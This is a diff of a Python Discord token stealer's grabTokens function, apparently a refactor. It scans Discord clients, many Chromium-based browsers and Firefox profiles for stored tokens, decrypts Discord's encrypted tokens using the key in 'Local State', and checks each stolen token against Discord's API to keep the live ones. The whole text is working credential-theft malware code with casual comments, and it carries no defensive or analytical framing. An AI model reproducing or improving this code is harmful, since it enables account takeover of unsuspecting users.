@@ -62,8 +62,6 @@ def get_token_key(path): # token encryption uses a key stored in a different fol
 
 def grabTokens():
     tokens = []
-    f = open(tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
-    f.write("Tokens:\n\n")
     paths = {
         'Discord': roaming + r'\\discord\\Local Storage\\leveldb\\',
         'Discord Canary': roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
@@ -87,28 +85,40 @@ def grabTokens():
         'Yandex': appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
         'Brave': appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
         'Iridium': appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
-        'Ungoogled Chromium': appdata + r'\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\'
-    }
+        'Ungoogled Chromium': appdata + r'\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\',
+        'Firefox': roaming + r'\\Mozilla\\Firefox\\Profiles'
+}
 
     for source, path in paths.items():
         if not os.path.exists(path):
             continue
         if not "discord" in path: # we first check if its not discord, cuz then we wont need the encryption bs at all and grab it like normal
-            for file_name in os.listdir(path):
-                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                    continue
-                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                    try:
-                        for token in findall(regex, line):
-                            try:
+            if "Mozilla" in path: # ha, yeah.. firefox needs extra care lmfao.
+                for loc, _, files in os.walk(path):
+                    for _file in files:
+                        if not _file.endswith('.sqlite'):
+                            continue
+                        for line in [x.strip() for x in open(f'{loc}\\{_file}', errors='ignore').readlines() if x.strip()]:
+                            for token in findall(regex, line):
                                 r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                                 if r.status_code == 200:
                                     if token in tokens:
                                         continue
                                     tokens.append(token)
-                    except Exception as e:
-                        print(e)
+
+            else: # If its not firefox
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                         continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for token in findall(regex, line):
+                            r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
+                            if r.status_code == 200:
+                                if token in tokens:
+                                    continue
+                                tokens.append(token)
+       
+
         else:
             for file_name in os.listdir(path): # if it is discord...
                 if not file_name.endswith('.log') and not file_name.endswith('.ldb'): # we get all leveldb files and log files
@@ -116,33 +126,13 @@ def grabTokens():
                 for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]: # strip them
                     for y in findall(encrypted_regex, line): # and find our encrypted regex
                         for i in ["discordcanary", "discord", "discordptb"]: # we check all discord installs
-                            try: # and try
-                                token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_token_key(roaming+ f'\\{i}\\Local State')) # to decrypt the shit
-                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)) # and then we just check if its valid
-                                if r.status_code == 200:
-                                    if token in tokens:
-                                        continue
-                                    tokens.append(token)
-                            except Exception as e:
-                                print(e)
-                                continue
-                                                    
-    if os.path.exists(roaming+"\\Mozilla\\Firefox\\Profiles"): # ha, yeah.. firefox needs extra care lmfao.
-        for path, _, files in os.walk(roaming+"\\Mozilla\\Firefox\\Profiles"):
-            for _file in files:
-                if not _file.endswith('.sqlite'):
-                    continue
-                for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
-                    for token in findall(regex, line):
-                        try:
-                            r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
+                            token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_token_key(roaming+ f'\\{i}\\Local State')) # to decrypt the shit
+                            r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)) # and then we just check if its valid
                             if r.status_code == 200:
                                 if token in tokens:
                                     continue
                                 tokens.append(token)
-                        except Exception as e:
-                            print(e)
-                            pass
+                                                    
 
 ```
 
